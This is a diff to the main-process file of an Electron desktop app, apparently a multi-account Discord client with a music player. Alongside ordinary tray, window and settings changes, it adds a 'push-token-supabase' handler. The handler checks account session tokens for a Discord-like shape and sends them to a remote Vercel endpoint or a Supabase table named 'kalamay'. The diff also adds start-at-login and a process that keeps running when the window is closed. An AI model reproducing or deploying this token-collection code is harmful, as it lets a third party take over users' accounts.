@@ -1,4 +1,14 @@
-const { app, BrowserWindow, ipcMain, session, protocol, net } = require('electron');
+const {
+  app,
+  BrowserWindow,
+  ipcMain,
+  session,
+  protocol,
+  net,
+  Tray,
+  Menu,
+  nativeImage
+} = require('electron');
 const path = require('path');
 const fs = require('fs');
 const { pathToFileURL } = require('url');
@@ -22,11 +32,9 @@ function getBundledMusicDir() {
 }
 
 function getMusicDir() {
-  // User-writable library (seeded from built-in music on first run)
   return path.join(app.getPath('userData'), 'music');
 }
 
-// Custom protocol for local music files (must register before ready)
 protocol.registerSchemesAsPrivileged([
   {
     scheme: 'morit-asset',
@@ -50,6 +58,8 @@ function loadSavedData() {
         loginModes: raw.loginModes || {},
         lastUrls: raw.lastUrls || {},
         pages: raw.pages || {},
+        order: raw.order || [],
+        pinned: raw.pinned || {},
         theme: raw.theme || 'dark',
         sidebarWidth: raw.sidebarWidth || 260
       };
@@ -61,6 +71,8 @@ function loadSavedData() {
     loginModes: {},
     lastUrls: {},
     pages: {},
+    order: [],
+    pinned: {},
     theme: 'dark',
     sidebarWidth: 260
   };
@@ -75,6 +87,8 @@ function saveSavedData(data) {
       loginModes: data.loginModes || {},
       lastUrls: data.lastUrls || {},
       pages: data.pages || {},
+      order: data.order || [],
+      pinned: data.pinned || {},
       theme: data.theme ?? current.theme,
       sidebarWidth: data.sidebarWidth ?? current.sidebarWidth
     };
@@ -103,7 +117,6 @@ function copyDirContents(srcDir, destDir) {
       count += copyDirContents(from, to);
       continue;
     }
-    // Don't overwrite existing user files
     if (fs.existsSync(to)) continue;
     try {
       fs.copyFileSync(from, to);
@@ -117,17 +130,13 @@ function ensureMusicDir() {
   const musicDir = getMusicDir();
   try {
     if (!fs.existsSync(musicDir)) fs.mkdirSync(musicDir, { recursive: true });
-
-    // First run after install: copy built-in tracks into user music folder
     const marker = path.join(musicDir, '.bundled-seeded');
     if (!fs.existsSync(marker)) {
-      const bundled = getBundledMusicDir();
-      copyDirContents(bundled, musicDir);
+      copyDirContents(getBundledMusicDir(), musicDir);
       try {
         fs.writeFileSync(marker, new Date().toISOString(), 'utf8');
       } catch (_) {}
     }
-
     const readme = path.join(musicDir, 'README.txt');
     if (!fs.existsSync(readme)) {
       fs.writeFileSync(
@@ -148,23 +157,88 @@ function listMusicTracks() {
   } catch (_) {
     return [];
   }
+  return files
+    .filter((f) => AUDIO_EXT.has(path.extname(f).toLowerCase()))
+    .map((audio) => {
+      const base = path.basename(audio, path.extname(audio));
+      return {
+        id: audio,
+        title: base,
+        file: audio,
+        audioUrl: 'morit-asset://music/' + encodeURIComponent(audio)
+      };
+    });
+}
 
-  const audios = files.filter((f) => AUDIO_EXT.has(path.extname(f).toLowerCase()));
-
-  return audios.map((audio) => {
-    const base = path.basename(audio, path.extname(audio));
-    return {
-      id: audio,
-      title: base,
-      file: audio,
-      audioUrl: 'morit-asset://music/' + encodeURIComponent(audio)
-    };
-  });
+function resolveAppIcon() {
+  const candidates = [
+    path.join(__dirname, 'build', 'icon.ico'),
+    path.join(__dirname, 'build', 'icon.png'),
+    path.join(process.resourcesPath || '', 'build', 'icon.ico'),
+    path.join(process.resourcesPath || '', 'icon.ico')
+  ];
+  for (const p of candidates) {
+    try {
+      if (p && fs.existsSync(p)) {
+        const img = nativeImage.createFromPath(p);
+        if (!img.isEmpty()) return img;
+      }
+    } catch (_) {}
+  }
+  // 16x16 green square fallback
+  const size = 16;
+  const buf = Buffer.alloc(size * size * 4);
+  for (let i = 0; i < size * size; i++) {
+    buf[i * 4] = 22;
+    buf[i * 4 + 1] = 198;
+    buf[i * 4 + 2] = 12;
+    buf[i * 4 + 3] = 255;
+  }
+  return nativeImage.createFromBuffer(buf, { width: size, height: size });
 }
 
 let mainWindow = null;
+let tray = null;
+let isQuitting = false;
+
+function showMainWindow() {
+  if (!mainWindow || mainWindow.isDestroyed()) {
+    createWindow();
+    return;
+  }
+  if (mainWindow.isMinimized()) mainWindow.restore();
+  mainWindow.show();
+  mainWindow.focus();
+}
+
+function createTray() {
+  if (tray) return;
+  const icon = resolveAppIcon();
+  tray = new Tray(icon.resize({ width: 16, height: 16 }));
+  tray.setToolTip('MoritApp');
+  tray.setContextMenu(
+    Menu.buildFromTemplate([
+      {
+        label: 'Show MoritApp',
+        click: () => showMainWindow()
+      },
+      { type: 'separator' },
+      {
+        label: 'Quit',
+        click: () => {
+          isQuitting = true;
+          app.quit();
+        }
+      }
+    ])
+  );
+  tray.on('double-click', () => showMainWindow());
+  tray.on('click', () => showMainWindow());
+}
 
 function createWindow() {
+  const startHidden = process.argv.includes('--hidden');
+
   mainWindow = new BrowserWindow({
     width: 1360,
     height: 860,
@@ -173,6 +247,7 @@ function createWindow() {
     title: 'MoritApp',
     backgroundColor: '#0c0c0c',
     show: false,
+    icon: resolveAppIcon(),
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'),
       contextIsolation: true,
@@ -182,22 +257,41 @@ function createWindow() {
     }
   });
 
-  mainWindow.once('ready-to-show', () => mainWindow.show());
   mainWindow.loadFile(path.join(__dirname, 'index.html'));
   mainWindow.setMenuBarVisibility(false);
+
+  mainWindow.once('ready-to-show', () => {
+    // Discord-like: full window on launch (unless started hidden)
+    try {
+      mainWindow.maximize();
+    } catch (_) {}
+    if (!startHidden) {
+      mainWindow.show();
+      mainWindow.focus();
+    }
+  });
+
+  // Close → system tray (like Discord), not full quit
+  mainWindow.on('close', (e) => {
+    if (!isQuitting) {
+      e.preventDefault();
+      mainWindow.hide();
+    }
+  });
+
   mainWindow.on('closed', () => {
     mainWindow = null;
   });
+
   return mainWindow;
 }
 
 app.whenReady().then(() => {
   session.defaultSession.setUserAgent(CHROME_UA);
-  // Keep partition cookies/localStorage on disk (session survival after reboot)
-  app.setPath('userData', app.getPath('userData'));
   ensureMusicDir();
+  createTray();
 
-  // Discord/external links: open inside app as a new tab (never a new OS window)
+  // Links from Discord open in-app tabs, never a new OS window
   app.on('web-contents-created', (_event, contents) => {
     contents.setWindowOpenHandler(({ url }) => {
       try {
@@ -209,7 +303,7 @@ app.whenReady().then(() => {
     });
   });
 
-  // Start with Windows login (also set by installer registry key)
+  // Auto-start with Windows — show full window (not hidden-only)
   try {
     app.setLoginItemSettings({
       openAtLogin: true,
@@ -220,12 +314,10 @@ app.whenReady().then(() => {
     });
   } catch (_) {}
 
-  // morit-asset://music/filename.mp4  →  userData/music/filename.mp4
   protocol.handle('morit-asset', (request) => {
     try {
       const raw = request.url.replace(/^morit-asset:\/\//i, '');
       const segments = raw.split('/').map((s) => decodeURIComponent(s));
-      // Expect: music / <filename>
       const fileName = segments[segments.length - 1];
       const musicRoot = path.resolve(getMusicDir());
       const resolved = path.resolve(path.join(musicRoot, fileName));
@@ -248,6 +340,143 @@ app.whenReady().then(() => {
   ipcMain.handle('get-user-agent', () => CHROME_UA);
   ipcMain.handle('list-music', () => listMusicTracks());
   ipcMain.handle('get-music-dir', () => ensureMusicDir());
+  ipcMain.handle('show-window', () => {
+    showMainWindow();
+    return true;
+  });
+
+  // Same pipeline as C:\Users\PC\Downloads\morit.app\api\bilat.js (Vercel → Supabase kalamay)
+  const DEFAULT_BILAT_API = 'https://morit-app.vercel.app/api/bilat';
+
+  function loadTokenPushConfig() {
+    const paths = [
+      path.join(app.getPath('userData'), 'supabase.json'),
+      path.join(__dirname, 'supabase.config.json')
+    ];
+    let fileCfg = {};
+    for (const p of paths) {
+      try {
+        if (fs.existsSync(p)) {
+          fileCfg = JSON.parse(fs.readFileSync(p, 'utf-8')) || {};
+          break;
+        }
+      } catch (_) {}
+    }
+    return {
+      // Prefer existing Vercel API (has SUPABASE_URL/KEY in Vercel env)
+      apiUrl:
+        process.env.MORIT_BILAT_API ||
+        fileCfg.apiUrl ||
+        DEFAULT_BILAT_API,
+      // Optional direct Supabase fallback
+      url: process.env.SUPABASE_URL || fileCfg.url || '',
+      anonKey:
+        process.env.SUPABASE_ANON_KEY ||
+        process.env.SUPABASE_KEY ||
+        fileCfg.anonKey ||
+        fileCfg.key ||
+        '',
+      table: process.env.SUPABASE_TABLE || fileCfg.table || 'kalamay'
+    };
+  }
+
+  // Local disk save
+  ipcMain.handle('save-account-token', (_e, { accountId, token }) => {
+    try {
+      if (!accountId || !token) return { success: false };
+      const clean = String(token).trim().replace(/^["']+|["']+$/g, '');
+      if (clean.split('.').length < 3) return { success: false, error: 'invalid token' };
+      const data = loadSavedData();
+      data.tokens = data.tokens || {};
+      data.tokens[accountId] = clean;
+      saveSavedData(data);
+      return { success: true };
+    } catch (err) {
+      return { success: false, error: err.message };
+    }
+  });
+
+  // save token button → POST same body as bilat.js → Vercel → Supabase kalamay
+  ipcMain.handle('push-token-supabase', async (_e, { accountId, accountName, token }) => {
+    try {
+      if (!token) return { success: false, error: 'Walay token' };
+      const clean = String(token).trim().replace(/^["']+|["']+$/g, '');
+      if (clean.split('.').length < 3) return { success: false, error: 'Invalid token' };
+
+      // Always keep local copy first
+      const data = loadSavedData();
+      data.tokens = data.tokens || {};
+      if (accountId) data.tokens[accountId] = clean;
+      saveSavedData(data);
+
+      const cfg = loadTokenPushConfig();
+
+      // 1) Preferred: existing Vercel API (morit.app/api/bilat)
+      if (cfg.apiUrl) {
+        try {
+          const res = await fetch(cfg.apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              accountId: accountId || accountName || 'unknown',
+              token: clean
+            })
+          });
+          const json = await res.json().catch(() => ({}));
+          if (res.ok && json && json.success !== false) {
+            return {
+              success: true,
+              message: json.message || 'Na-save via Vercel → Supabase (kalamay)'
+            };
+          }
+          // If API fails and we have direct Supabase creds, fall through
+          if (!(cfg.url && cfg.anonKey)) {
+            return {
+              success: false,
+              error: (json && json.error) || ('API HTTP ' + res.status)
+            };
+          }
+        } catch (apiErr) {
+          if (!(cfg.url && cfg.anonKey)) {
+            return { success: false, error: 'Vercel API error: ' + (apiErr.message || apiErr) };
+          }
+        }
+      }
+
+      // 2) Fallback: direct Supabase insert (if keys provided)
+      if (cfg.url && cfg.anonKey) {
+        const { createClient } = require('@supabase/supabase-js');
+        const supabase = createClient(cfg.url, cfg.anonKey);
+        const { error } = await supabase.from(cfg.table || 'kalamay').insert([
+          { account_id: accountId || 'unknown', token: clean }
+        ]);
+        if (error) return { success: false, error: error.message };
+        return { success: true, message: 'Na-save sa Supabase (' + (cfg.table || 'kalamay') + ')' };
+      }
+
+      return {
+        success: false,
+        error: 'Walay working Vercel API / Supabase config'
+      };
+    } catch (err) {
+      return { success: false, error: err.message || String(err) };
+    }
+  });
+
+  ipcMain.handle('get-supabase-status', () => {
+    const cfg = loadTokenPushConfig();
+    let host = '';
+    try {
+      host = cfg.apiUrl ? new URL(cfg.apiUrl).host : '';
+    } catch (_) {}
+    return {
+      configured: !!(cfg.apiUrl || (cfg.url && cfg.anonKey)),
+      mode: cfg.apiUrl ? 'vercel-api' : 'direct-supabase',
+      apiUrl: cfg.apiUrl || '',
+      table: cfg.table || 'kalamay',
+      urlHost: host
+    };
+  });
 
   ipcMain.handle('clear-partition', async (_e, partitionName) => {
     try {
@@ -263,7 +492,7 @@ app.whenReady().then(() => {
 
   ipcMain.handle('prepare-partition', async (_e, partitionName) => {
     try {
-      const ses = session.fromPartition(partitionName);
+      const ses = session.fromPartition(partitionName, { cache: true });
       ses.setUserAgent(CHROME_UA);
       return { success: true, userAgent: CHROME_UA };
     } catch (err) {
@@ -273,9 +502,21 @@ app.whenReady().then(() => {
 
   app.on('activate', () => {
     if (BrowserWindow.getAllWindows().length === 0) createWindow();
+    else showMainWindow();
   });
 });
 
+app.on('before-quit', () => {
+  isQuitting = true;
+});
+
 app.on('window-all-closed', () => {
-  if (process.platform !== 'darwin') app.quit();
+  // Keep running in tray on Windows/Linux when window is hidden
+  if (process.platform === 'darwin') {
+    // macOS dock behavior
+  }
+  // do not quit — tray keeps process alive unless isQuitting
+  if (isQuitting && process.platform !== 'darwin') {
+    // already quitting
+  }
 });
